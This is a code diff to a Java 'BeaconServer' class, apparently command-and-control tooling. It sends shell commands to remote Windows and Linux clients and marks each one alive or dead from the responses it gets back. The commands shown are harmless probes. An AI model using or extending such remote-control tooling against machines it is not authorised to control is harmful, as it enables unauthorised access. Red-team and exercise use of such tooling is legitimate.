@@ -167,29 +167,33 @@ public class BeaconServer implements Runnable{
         HashMap<String, Boolean> clientStatus = new HashMap<>();
 
         // Check all Windows Boxes
-        distributeCommands("Windows", "");
+        distributeCommands("Windows", "(pwd).path");
         for (String ip : windowsClientResponses.keySet()){
-            ArrayList<String> responses = getSingleClientResponses(ip);
-        if (responses.size() == 0){
-            if (responses.get(responses.size()-1).equals("Hello World")){
-            clientStatus.put(ip, true);
-            }
-            else {
-                clientStatus.put(ip, false);
-            }
-        }
-        
+            if (windowsClientResponses.get(ip).size() != 0){
+                if (windowsClientResponses.get(ip).contains("C:\\Windows\\fonts")){
+                    // If responses contains the string we just send a command to get, then remove it, and give it true
+                    ArrayList<String> tempList = windowsClientResponses.get(ip);
+                    tempList.remove("C:\\Windows\\fonts");
+                    windowsClientResponses.put(ip, tempList);
+                    clientStatus.put(ip, true);
+                } else {
+                    clientStatus.put(ip, false);
+                }
+            }   
         }
         // Check all Linux Boxes
-        distributeCommands("Linux", "echo 'Hello World'");
         for (String ip : linuxClientResponses.keySet()){
-            ArrayList<String> responses = getSingleClientResponses(ip);
-        if (responses.get(responses.size()-1).equals("Hello World")){
-            clientStatus.put(ip, true);
-        }
-        else {
-            clientStatus.put(ip, false);
-        }
+            if (linuxClientResponses.get(ip).size() != 0){
+                if (linuxClientResponses.get(ip).contains("1. root")){
+                    // If responses contains the string we just send a command to get, then remove it, and give it true
+                    ArrayList<String> tempList = linuxClientResponses.get(ip);
+                    tempList.remove("1. root");
+                    linuxClientResponses.put(ip, tempList);
+                    clientStatus.put(ip, true);
+                } else {
+                    clientStatus.put(ip, false);
+                }
+            }   
         }
         
 
